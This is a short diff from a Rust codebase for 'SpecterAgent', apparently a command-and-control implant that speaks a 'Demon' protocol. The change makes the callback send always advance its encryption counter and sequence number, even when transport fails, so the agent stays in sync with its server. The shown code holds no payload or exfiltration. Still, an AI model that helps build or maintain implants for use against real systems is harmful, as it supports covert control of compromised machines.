@@ -521,14 +521,14 @@ impl SpecterAgent {
             request_id,
             payload,
         )?;
-        let response = self.transport.send(&packet).await?;
+        let result = self.transport.send(&packet).await;
 
-        // Monotonic CTR: advance the shared offset by the blocks consumed by the
-        // seq-protected encrypted inner body (see `build_callback_packet`).
+        // Always advance seq and request-side CTR — the server consumes both
+        // before sending a response, so skipping on transport failure desyncs.
         self.ctr_offset += callback_ctr_blocks(command_id, payload.len());
         self.callback_seq += 1;
 
-        Ok(response)
+        result
     }
 
     // ── Legacy Demon-protocol helpers ─────────────────────────────────────────
